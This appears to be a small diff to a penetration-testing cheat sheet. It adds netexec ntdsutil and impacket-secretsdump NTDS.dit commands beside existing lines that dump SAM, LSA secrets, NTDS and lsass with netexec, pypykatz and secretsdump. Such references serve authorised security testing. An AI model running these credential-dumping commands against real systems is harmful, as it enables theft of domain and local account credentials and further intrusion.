@@ -797,6 +797,7 @@ $ netexec smb <IP address> -u <username> -p <password> --shares
 $ netexec smb <IP address> --local-auth -u <username> -p <password> --sam
 $ netexec smb <IP address> --local-auth -u <username> -p <password> --lsa
 $ netexec smb <IP address> -u <username> -p <password> --ntds
+$ netexec smb <IP address> -u <username> -p <password> -M ntdsutil
 ```
 
 - PCredz
@@ -1022,6 +1023,7 @@ $ pypykatz lsa minidump lsass.dmp
 
 ```
 $ python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
 
 - For Loops
